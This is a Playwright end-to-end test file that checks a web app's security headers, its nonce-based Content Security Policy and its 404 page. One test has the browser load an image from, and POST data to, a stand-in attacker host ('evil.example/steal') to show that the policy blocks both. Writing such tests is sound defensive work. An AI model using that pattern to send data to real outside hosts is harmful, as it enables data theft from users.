/**
 * End-to-end checks of the web hardening added in Phase 8 Part B: security headers, the
 * Content Security Policy (CSP), and the friendly "page not found" page.
 *
 * These run against the real app in a real browser, because a CSP only matters if the BROWSER
 * enforces it and the app keeps working under it. Two kinds of checks:
 *   1. the headers and the nonce are present and correct (read straight from HTTP responses);
 *   2. real pages, including the map and photo upload, run with ZERO policy violations, and the
 *      browser really does block loads from an unknown site.
 */
import { expect, test, type Page } from "@playwright/test";
import { resetRateLimits, signInThroughEmail, stamp, stubMapTiles, submitPothole } from "./helpers";

test.beforeAll(resetRateLimits);

/**
 * Starts recording every Content Security Policy violation the browser reports on this page.
 * `securitypolicyviolation` is a standard browser event fired each time the policy blocks something.
 * The recorder is installed before any page script runs, so nothing is missed.
 */
async function recordCspViolations(page: Page) {
  await page.addInitScript(() => {
    const violations: string[] = [];
    (window as unknown as { __csp: string[] }).__csp = violations;
    window.addEventListener("securitypolicyviolation", (event) => {
      violations.push(`${event.violatedDirective} blocked ${event.blockedURI || "inline"}`);
    });
  });
}

/** Reads back the violations recorded so far on the current page. */
const violationsOn = (page: Page) => page.evaluate(() => (window as unknown as { __csp?: string[] }).__csp ?? []);

test.describe("security headers", () => {
  test("every page carries the standard protective headers", async ({ request }) => {
    const response = await request.get("/");
    const headers = response.headers();

    expect(headers["x-content-type-options"]).toBe("nosniff");
    expect(headers["referrer-policy"]).toBe("strict-origin-when-cross-origin");
    expect(headers["x-frame-options"]).toBe("DENY");
    expect(headers["cross-origin-opener-policy"]).toBe("same-origin");
    expect(headers["permissions-policy"]).toContain("geolocation=(self)");
    expect(headers["permissions-policy"]).toContain("camera=()");
    // The app should not announce which framework it is built with.
    expect(headers["x-powered-by"]).toBeUndefined();
    // HSTS only makes sense over HTTPS, so it is sent in production deployments, not in this test run.
    expect(headers["strict-transport-security"]).toBeUndefined();
  });

  test("the Content Security Policy is present, strict about scripts, and blocks framing", async ({ request }) => {
    const csp = (await request.get("/")).headers()["content-security-policy"] ?? "";
    expect(csp).toMatch(/script-src 'self' 'nonce-[A-Za-z0-9+/=]+' 'strict-dynamic'/);
    expect(csp).toContain("frame-ancestors 'none'");
    expect(csp).toContain("object-src 'none'");
    expect(csp).toContain("img-src 'self' data: blob: https://tile.openstreetmap.org");
    // No catch-all wildcard source.
    expect(csp).not.toMatch(/(^|\s)\*(\s|;|$)/);
  });

  test("each request gets a NEW nonce, and the page's own scripts carry it", async ({ request }) => {
    const nonceOf = (csp: string) => /'nonce-([^']+)'/.exec(csp)?.[1] ?? "";
    const first = await request.get("/track");
    const second = await request.get("/track");
    const firstNonce = nonceOf(first.headers()["content-security-policy"] ?? "");
    const secondNonce = nonceOf(second.headers()["content-security-policy"] ?? "");

    expect(firstNonce).not.toBe("");
    expect(firstNonce).not.toBe(secondNonce);
    // Next.js stamped that nonce on the scripts it put in the page; that is what lets them run.
    expect(await first.text()).toContain(`nonce="${firstNonce}"`);
  });

  test("API routes and pages that do not exist still get the basic headers", async ({ request }) => {
    const health = await request.get("/api/health");
    expect(health.headers()["x-content-type-options"]).toBe("nosniff");
    const missing = await request.get("/this-page-does-not-exist");
    expect(missing.status()).toBe(404);
    expect(missing.headers()["x-content-type-options"]).toBe("nosniff");
  });
});

test.describe("the policy is enforced and the app still works under it", () => {
  test("the browser blocks loads from an unknown site", async ({ page }) => {
    await recordCspViolations(page);
    await page.goto("/track");

    // Try to load an image and make a request to a site that is NOT on the allow-list. If the
    // policy is really enforced, the browser refuses both, before sending anything.
    await page.evaluate(async () => {
      const img = new Image();
      img.src = "https://evil.example/pixel.png";
      document.body.appendChild(img);
      await fetch("https://evil.example/steal", { method: "POST", body: "x" }).catch(() => undefined);
    });
    await page.waitForTimeout(300); // allow the violation events to fire
    const blocked = await violationsOn(page);
    expect(blocked.some((v) => v.startsWith("img-src") && v.includes("evil.example"))).toBe(true);
    expect(blocked.some((v) => v.startsWith("connect-src") && v.includes("evil.example"))).toBe(true);
  });

  test("public pages run with no policy violations", async ({ page }) => {
    await recordCspViolations(page);
    for (const path of ["/", "/track", "/sign-in", "/this-page-does-not-exist"]) {
      await page.goto(path);
      expect(await violationsOn(page), `violations on ${path}`).toEqual([]);
    }
  });

  test("the report form, map and photo upload work with no policy violations", async ({ page }) => {
    await stubMapTiles(page);
    await recordCspViolations(page);
    await signInThroughEmail(page, `e2e-${stamp}-sec-resident@example.com`, "/report/new");
    // The whole journey: map click (tiles load), photo shrink + upload, submit, view the report with its photo.
    const reportUrl = await submitPothole(page);
    expect(reportUrl).toMatch(/\/reports\/[0-9a-f-]{36}$/);
    await expect(page.getByRole("img", { name: "Photo 1 of the reported problem" })).toBeVisible();
    // Violations are recorded per page load, so check the form page too by returning to it.
    await page.goto("/report/new");
    await expect(page.locator(".leaflet-container")).toBeVisible();
    expect(await violationsOn(page)).toEqual([]);
  });
});

test.describe("the not-found page", () => {
  test("gives a friendly 404 that reveals nothing about why", async ({ page }) => {
    const response = await page.goto("/this-page-does-not-exist");
    expect(response?.status()).toBe(404);
    await expect(page.getByRole("heading", { name: "Page not found" })).toBeVisible();
    await expect(page.getByRole("link", { name: "Go to the home page" })).toBeVisible();
    // It does not echo the address back or mention the framework.
    await expect(page.getByText("this-page-does-not-exist")).toHaveCount(0);
  });

  test("an admin page does not error for a signed-out visitor (who is sent to sign in)", async ({ page }) => {
    // (That non-admins get exactly this 404 page is checked in administration-journey.spec.ts.)
    const response = await page.goto("/admin");
    expect(response?.status()).toBeLessThan(500);
    await expect(page).toHaveURL(/\/sign-in/);
  });
});
